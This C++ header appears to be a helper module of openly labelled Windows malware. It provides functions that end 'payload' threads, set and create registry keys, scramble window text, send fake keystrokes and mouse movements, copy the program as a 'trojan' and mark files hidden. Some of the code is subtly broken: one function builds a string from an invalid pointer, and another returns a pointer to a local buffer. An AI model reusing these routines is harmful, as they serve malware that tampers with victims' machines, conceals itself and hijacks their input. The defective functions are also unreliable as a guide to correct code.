#pragma once

#include "includer.h"

// THANKS FOR ARTICZERA (THE ORIGINAL CREATOR OF THIS NAMESPACE)
namespace System
{
    VOID RedrawScreen(VOID)
    {
        RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
    }

    VOID EndPayload(HANDLE hPayload, HANDLE hPML)
    {
        TerminateThread(hPayload, NULL);
        CloseHandle(hPayload);
        HeapDestroy(hPML);
    }

    VOID SetRegValue(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, LPBYTE lpData, DWORD cbData)
    {
        HKEY phkResult;

        RegOpenKeyExW(hKey, lpSubKey, NULL, KEY_SET_VALUE, &phkResult);
        RegSetValueExW(phkResult, lpValueName, NULL, dwType, lpData, cbData);

        RegCloseKey(phkResult);
    }

    VOID CreateRegKey(HKEY hKey, LPCWSTR lpSubKey)
    {
        HKEY phkResult;

        RegCreateKeyW(hKey, lpSubKey, &phkResult);

        RegCloseKey(phkResult);
    }

    BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
    {
        const WCHAR* labelText = L"" + rand() % 512;

        if (GetWindowLongW(hwnd, GWL_STYLE) & WS_VISIBLE)
        {
            SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)labelText);
        }

        return true;
    }

    VOID PressKey(WORD key, INT time)
    {
        INPUT pInputs = { 0 };

        pInputs.type = INPUT_KEYBOARD;
        pInputs.ki.wVk = key;

        SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));

        Sleep(time);

        pInputs.ki.dwFlags = KEYEVENTF_KEYUP;

        SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));
    }

    VOID MoveMouse(INT x, INT y)
    {
        INPUT pInputs = { 0 };
        pInputs.type = INPUT_MOUSE;
        pInputs.mi.dx = x;
        pInputs.mi.dy = y;
        pInputs.mi.dwFlags = MOUSEEVENTF_MOVE;
        SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));
	}

    LPCWSTR CurrentDirectory()
    {
        WCHAR buffer[MAX_PATH];
        GetModuleFileName(NULL, buffer, MAX_PATH);

        return (LPCWSTR)buffer;
    }

    VOID CopyTrojan(LPCWSTR orgPathFile, WCHAR dstPathFile[])
    {
        CopyFileW(orgPathFile, dstPathFile, TRUE);
    }

    VOID HideFile(LPCWSTR orgPathFile)
    {
        SetFileAttributesW(orgPathFile, FILE_ATTRIBUTE_HIDDEN);
    }
}